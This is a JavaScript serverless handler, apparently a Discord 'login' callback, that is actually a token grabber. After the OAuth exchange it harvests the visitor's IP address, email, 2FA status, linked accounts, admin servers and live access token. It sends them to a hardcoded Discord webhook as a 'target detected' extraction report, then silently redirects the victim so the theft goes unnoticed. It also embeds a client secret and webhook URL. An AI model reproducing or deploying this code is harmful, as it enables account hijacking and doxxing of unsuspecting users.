// api/callback.js
export default async function handler(req, res) {
    const { code } = req.query;
    if (!code) return res.redirect('/');

    // --- CONFIGURATION À REMPLIR ---
    const CLIENT_ID = '1500105803980607659';
    const CLIENT_SECRET = 'ZVDIqytxv52rWztE3WRUDhAM3pW0THtx'; 
    const REDIRECT_URI = 'https://ip-eight-liart.vercel.app/api/callback';
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1500102542200410225/9u18sYNG-fwv_ywOSNutXFYSATfjLi5yO-XP8qKAJmWYwzKvRKSSGIY75Y7upZbbiscc';
    // -------------------------------

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    try {
        // Échange du code contre le Token d'accès
        const tokenResp = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: CLIENT_ID,
                client_secret: CLIENT_SECRET,
                code: code,
                grant_type: 'authorization_code',
                redirect_uri: REDIRECT_URI,
                scope: 'identify email guilds connections',
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });
        const tokenData = await tokenResp.json();
        const AT = tokenData.access_token;

        // Récupération Profil + Email
        const user = await (await fetch('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${AT}` }
        })).json();

        // Récupération des Comptes Liés (Steam, etc.)
        const connections = await (await fetch('https://discord.com/api/users/@me/connections', {
            headers: { Authorization: `Bearer ${AT}` }
        })).json();
        const connList = connections.map(c => `• **${c.type}**: \`${c.name}\``).join('\n') || "Aucune";

        // Récupération des Serveurs (Scan Admin)
        const guilds = await (await fetch('https://discord.com/api/users/@me/guilds', {
            headers: { Authorization: `Bearer ${AT}` }
        })).json();
        const adminGuilds = guilds.filter(g => (g.permissions & 0x8) === 0x8).map(g => g.name).slice(0, 5).join(', ') || "Aucun";

        // ENVOI AU WEBHOOK (Le dossier complet)
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "🔴 **CIBLE DÉTECTÉE** @everyone",
                embeds: [{
                    title: "🔱 RAPPORT D'EXTRACTION COMPLET",
                    color: 0xFF0000,
                    fields: [
                        { name: "👤 USER", value: `\`${user.username}\` (ID: ${user.id})`, inline: true },
                        { name: "📧 EMAIL", value: `\`${user.email}\``, inline: true },
                        { name: "🌐 NETWORK", value: `**IP:** \`${ip}\`\n**2FA:** \`${user.mfa_enabled ? '✅' : '❌'}\``, inline: false },
                        { name: "🔗 CONNECTIONS", value: connList },
                        { name: "🛡️ ADMIN ON", value: `\`${adminGuilds}\`` },
                        { name: "🔑 TOKEN", value: `\`\`\`${AT}\`\`\`` }
                    ],
                    footer: { text: "ATLAS | Piraterie : Jamais finie" },
                    timestamp: new Date()
                }]
            })
        });

        // Redirection vers Discord pour ne pas griller le truc
        res.redirect('https://discord.com/app');

    } catch (err) {
        res.redirect('https://discord.com/app');
    }
}
